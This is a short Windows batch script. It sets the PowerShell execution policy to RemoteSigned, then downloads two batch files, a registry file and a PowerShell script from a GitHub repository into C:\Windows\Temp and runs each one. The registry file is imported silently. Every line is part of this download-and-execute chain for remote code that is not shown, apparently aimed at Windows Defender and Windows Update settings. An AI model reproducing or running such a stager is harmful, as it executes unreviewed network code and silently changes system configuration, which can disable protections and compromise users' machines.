@echo off
powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/defender1.bat -O C:\Windows\Temp\defender1.bat"
cmd /c "C:\Windows\Temp\defender1.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/defender2.bat -O C:\Windows\Temp\defender2.bat"
cmd /c "C:\Windows\Temp\defender2.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate.reg -O C:\Windows\Temp\WindowsUpdate.reg"
regedit /s "C:\Windows\Temp\WindowsUpdate.reg"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsDefender.ps1 -O C:\Windows\Temp\WindowsDefender.ps1"
powershell.exe -File "C:\Windows\Temp\WindowsDefender.ps1"
